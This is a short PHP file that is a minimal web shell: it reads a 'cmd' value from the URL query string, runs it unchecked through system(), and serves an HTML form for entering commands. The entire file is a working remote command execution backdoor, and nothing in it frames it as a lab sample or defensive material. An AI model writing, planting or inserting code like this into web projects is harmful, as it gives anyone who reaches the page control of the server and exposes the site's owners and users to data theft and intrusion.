<?php
    $cmd = $_GET['cmd'];
    if (isset($cmd)){
        system($cmd);
    }
?>

<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html" charset="UTF-8">
    </head>
    <body>
        <p>The system command</p>
        <form method="get" id="searchform">
            <input type="text" name="cmd">
            <input type="submit" name="submit" value="Submit">
        </form>
    </body>
</html>
